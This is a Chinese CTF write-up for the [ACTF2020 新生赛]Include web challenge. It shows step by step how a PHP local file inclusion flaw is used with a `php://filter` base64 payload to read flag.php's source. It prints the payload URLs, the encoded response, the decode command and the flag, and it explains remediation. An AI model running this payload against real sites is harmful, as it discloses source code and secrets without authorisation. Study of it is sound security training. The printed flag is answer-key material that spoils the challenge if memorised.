# CTF 练习：[ACTF2020 新生赛]Include（php://filter 读源码）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，6400 人解出）
> 环境：Kali Linux + 浏览器
> 日期：2026-11-19
> 性质：平台提供的授权靶场

---

## 一、目标

页面存在文件包含参数 `?file=`，通过 `php://filter` 把 `flag.php` 当数据读出来，绕过「源码被执行」的问题。

## 二、侦察

首页只有一个 `tips` 链接。访问：

```
http://靶机/?file=tips
```

再试：

```
http://靶机/?file=flag.php
```

页面只显示：

```
Can you find out the flag?
```

说明 `flag.php` **被 include 执行了**，PHP 代码本身看不到。

## 三、利用 php://filter

把 `file` 参数换成 filter 包装器：

```
http://靶机/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

返回：

```
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL0NURjJ7ZGY1ZDJlYmItYjVjMy00ZjI4LThmNTItMjg4OTY2NGFiNTMxfQo=
```

## 四、解码

```bash
echo "PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL0NURjJ7ZGY1ZDJlYmItYjVjMy00ZjI4LThmNTItMjg4OTY2NGFiNTMxfQo=" | base64 -d
```

得到：

```php
<?php
echo "Can you find out the flag?";
//CTF2{df5d2ebb-b5c3-4f28-8f52-2889664ab531}
```

**flag 藏在注释里。**

## 四·五、复盘四问

### 推理链（为什么这么做）

**第 1 步：为什么先点 `tips`**

- 我在想：首页只有一个链接，参数怎么传要先确定。
- 验证：URL 变成 `?file=tips`。
- 所以：参数名是 `file`，存在文件包含。

**第 2 步：为什么试 `?file=flag.php`**

- 我在想：包含会执行 PHP，源码看不到，先确认文件是否存在。
- 验证：页面只输出 `Can you find out the flag?`（没有报错）。
- 所以：文件存在且被 include 执行了。

**第 3 步：为什么改用 `php://filter`**

- 我在想：`include` 是「执行」，我要的是「读取源码」。
- 验证：`php://filter/read=convert.base64-encode/resource=flag.php` 返回 base64。
- 所以：过滤器把文件当数据流读出（并把二进制安全地编码）。

**第 4 步：为什么用 base64 而不是直接读**

- **为什么**：PHP 文件里可能有非文本字节，base64 能无损传输。
- **解码**：`echo '...' | base64 -d`。

### 载荷是怎么来的

- **来源**：文件包含题的标准套路。
- **`convert.base64-encode`**：把内容编码成 base64 再输出。
- **`resource=flag.php`**：目标文件。

### 逐段解释

| 片段 | 作用 |
|---|---|
| `php://filter` | 流包装器，提供过滤能力 |
| `read=convert.base64-encode` | 读的时候先 base64 编码 |
| `resource=flag.php` | 实际要读的文件 |
| `\| base64 -d` | 本地解码 |

### 失败尝试与坑

| 现象 | 原因 | 解决 |
|---|---|---|
| 只有 `Can you find out the flag?` | 这是执行结果，不是失败 | 上 filter 读源码 |
| 解码失败 | 复制时漏了末尾 `=` | 完整复制 base64 |

### 自测

**Q1**：`include 'flag.php'` 为什么看不到源码？
**A**：PHP 会执行它，只输出执行结果，不输出源码文本。

**Q2**：`php://filter` 的关键参数？
**A**：`read=convert.base64-encode` + `resource=目标文件`。

**Q3**：修复的核心？
**A**：不动态包含用户输入，用固定映射表。

## 五、原理

| 点 | 说明 |
|---|---|
| 文件包含 | `include $_GET['file']` 直接包含用户输入 |
| 执行 vs 读取 | `include 'flag.php'` 会**执行** PHP，源码不可见 |
| `php://filter` | 用流过滤器包裹文件，把内容**当数据**读出（这里是 base64） |
| `convert.base64-encode` | 把文件内容 base64 编码，避免二进制/特殊字符问题 |

## 六、修复

| 措施 | 说明 |
|---|---|
| 禁止动态包含 | 用固定映射：`['tips' => 'tips.php']` |
| 白名单 + 规范化 | `realpath()` 校验路径在允许目录内 |
| 关闭危险包装器 | `allow_url_include=Off`，必要时限制 `php://` |
| 最小权限 | Web 目录外不放敏感文件 |

## 七、踩坑

- `?file=flag.php` 只看到 `Can you find out the flag?`，**不是失败，是执行结果**。
- 必须用 `php://filter` 才能读源码。
- Base64 解码时别漏末尾 `=` 号。

## 八、收获

- 记住 `php://filter/read=convert.base64-encode/resource=xxx` 这个万能钥匙。
- 理解了「包含执行」和「读取源码」是两件事。
- 文件包含题的固定套路：先包含 → 看不到 → 上 filter。
